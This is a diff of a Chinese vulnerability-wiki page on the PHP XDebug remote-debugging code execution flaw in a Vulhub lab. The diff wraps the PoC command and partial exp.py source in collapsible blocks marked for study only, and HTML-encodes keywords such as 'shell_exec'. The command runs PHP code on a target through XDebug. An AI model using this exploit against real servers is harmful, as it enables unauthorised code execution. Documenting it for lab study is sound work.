@@ -46,10 +46,13 @@ docker compose up -d
 
 Vulhub 提供了 [exp.py](https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py)，指定目标 web 地址、待执行的 php 代码即可：
 
-```
-# 要求用python3并安装requests库
-python3 exp.py -t http://127.0.0.1:8080/index.php -c 'shell_exec('id');'
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text"># 要求用python3并安装requests库
+python3 exp.py -t http://127.0.0.1:8080/index.php -c '&#115;hell_&#101;xec('id');'</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%20XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/image-20240529112516798.png)
 
@@ -59,8 +62,10 @@ python3 exp.py -t http://127.0.0.1:8080/index.php -c 'shell_exec('id');'
 
 exp.py
 
-```python
-#!/usr/bin/env python3
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-python">#!/usr/bin/env python3
 import re
 import sys
 import time
@@ -91,12 +96,12 @@ def recv_xml(sock):
 
         while data:
             eop = data.find(b'\x00')
-            if eop < 0:
+            if eop &lt; 0:
                 break
             blocks.append(data[:eop])
             data = data[eop+1:]
 
-        if len(blocks) >= 4:
+        if len(blocks) &gt;= 4:
             break
     
     return blocks[3]
@@ -129,7 +134,7 @@ if __name__ == '__main__':
 
     data = recv_xml(conn)
     print('[+] Recieve data: ' + data.decode())
-    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
+    g = re.search(rb'&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;', data, re.I)
     if not g:
         print('[-] No result...')
         sys.exit(0)
@@ -137,11 +142,12 @@ if __name__ == '__main__':
     data = g.group(1)
 
     try:
-        print('[+] Result: ' + base64.b64decode(data).decode())
+        print('[+] Result: ' + &#98;ase64.&#98;64decode(data).decode())
     except binascii.Error:
         print('[-] May be not string result...')
+</code></pre>
 
-```
+</details>
 
 ---
 
